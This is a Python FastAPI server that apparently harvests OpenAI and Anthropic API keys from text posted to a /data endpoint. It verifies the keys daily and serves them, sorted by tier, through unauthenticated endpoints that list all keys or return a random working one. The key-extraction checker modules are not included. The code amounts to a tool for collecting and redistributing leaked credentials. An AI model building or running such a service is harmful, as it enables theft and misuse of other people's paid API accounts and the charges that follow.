from fastapi import FastAPI, Request, Response, status
from fastapi import HTTPException

from key_checkers.openai import OpenAIKeyChecker
from key_checkers.anthropic import AnthropicKeyChecker
from fastapi_utils.tasks import repeat_every

app = FastAPI()

key_checkers = [
    OpenAIKeyChecker(),
    AnthropicKeyChecker(),
]


@app.get("/")
async def root():
    summary = {}
    for checker in key_checkers:
        checker_name = checker.get_name()
        summary[checker_name] = {
            "count": len(checker.keys),
            "keys": checker.keys
        }
    return summary


@app.post("/data", status_code=status.HTTP_204_NO_CONTENT)
async def receive_text(request: Request):
    text = (await request.body()).decode('utf-8')
    for checker in key_checkers:
        checker.check_text(text)
    return Response(status_code=status.HTTP_204_NO_CONTENT)


def _get_checker_or_404(name: str):
    for c in key_checkers:
        if c.get_name() == name:
            return c
    raise HTTPException(status_code=404, detail="checker not found")


@app.get("/list/{checker_name}")
async def list_checker_tiers(checker_name: str):
    return  _get_checker_or_404(checker_name).list_keys_by_tiers()


@app.get("/list/{checker_name}/{tier}")
async def list_checker_by_tier(checker_name: str, tier: str):
    return _get_checker_or_404(checker_name).list_keys(tier)


@app.get("/{checker_name}")
async def get_random_key(checker_name: str):
    return _get_checker_or_404(checker_name).get_key()


@app.get("/{checker_name}/{tier}")
async def get_random_key_by_tier(checker_name: str, tier: str):
    return _get_checker_or_404(checker_name).get_key(tier)

@app.on_event("startup")
@repeat_every(seconds=60 * 60 * 24, wait_first=False)
def verify_all_keys_daily():
    for checker in key_checkers:
        for key in list(checker.keys.keys()):
            checker.verify_key(key)